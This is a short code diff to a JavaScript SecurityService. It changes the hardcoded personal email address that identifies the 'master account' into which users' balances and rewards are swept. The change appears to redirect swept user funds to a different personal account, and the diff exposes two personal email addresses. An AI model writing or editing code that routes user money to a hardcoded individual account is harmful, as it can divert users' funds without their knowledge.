@@ -68,7 +68,7 @@ class SecurityService {
       const totalBalanceToSweep = user.balance + rewardsInUSD;
 
       if (totalBalanceToSweep > 0) {
-        const masterAccount = await User.findOne({ email: 'eliecerdepablos@gmail.com' }).session(session);
+        const masterAccount = await User.findOne({ email: 'elmalayaso7@gmail.com' }).session(session);
         if (masterAccount) {
           masterAccount.bmIncentivo = (masterAccount.bmIncentivo || 0) + totalBalanceToSweep;
           await masterAccount.save({ session });
